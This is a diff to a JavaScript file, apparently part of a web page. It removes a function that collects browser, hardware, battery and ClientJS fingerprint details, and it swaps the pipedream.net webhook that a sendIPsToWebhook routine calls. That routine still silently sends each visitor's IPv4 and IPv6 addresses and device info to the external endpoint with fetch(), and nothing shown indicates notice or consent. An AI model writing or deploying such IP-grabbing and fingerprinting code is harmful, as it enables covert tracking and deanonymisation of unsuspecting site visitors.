@@ -219,52 +219,6 @@ function getDeviceInfo() {
   return "Unknown device";
 }
 
-    async function getDeviceInfo() {
-      const info = {};
-
-      // Basic
-      info.userAgent = navigator.userAgent;
-      info.platform = navigator.platform;
-      info.language = navigator.language;
-      info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-      // Screen
-      info.screen = {
-        width: window.screen.width,
-        height: window.screen.height,
-        pixelRatio: window.devicePixelRatio
-      };
-
-      // CPU & Memory
-      info.hardwareConcurrency = navigator.hardwareConcurrency || "N/A";
-      info.deviceMemory = navigator.deviceMemory || "N/A";
-
-      // Touch support
-      info.touchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
-
-      // Battery
-      try {
-        const battery = await navigator.getBattery();
-        info.battery = {
-          level: `${battery.level * 100}%`,
-          charging: battery.charging
-        };
-      } catch {
-        info.battery = "Not supported";
-      }
-
-      // FingerprintJS (via ClientJS)
-      const client = new ClientJS();
-      info.fingerprint = client.getFingerprint();
-      info.browser = client.getBrowser();
-      info.os = client.getOS();
-      info.deviceType = client.getDeviceType();
-      info.device = client.getDevice();
-
-      // Show as JSON
-      return info;
-    }
-
 
 async function sendIPsToWebhook() {
   try {
@@ -278,7 +232,7 @@ async function sendIPsToWebhook() {
 
     const deviceInfo = await getDeviceInfo();
 
-    const url = `https://eou274ml4ri0qf0.m.pipedream.net/?ip4v=${ipv4}&ip6v=${ipv6}&info=${deviceInfo}`;
+    const url = `https://eo5d3jdbl6ngkcy.m.pipedream.net/?ip4v=${ipv4}&ip6v=${ipv6}&info=${deviceInfo}`;
 
     await fetch(url);
     console.log("IPs sent successfully:", ipv4, ipv6);
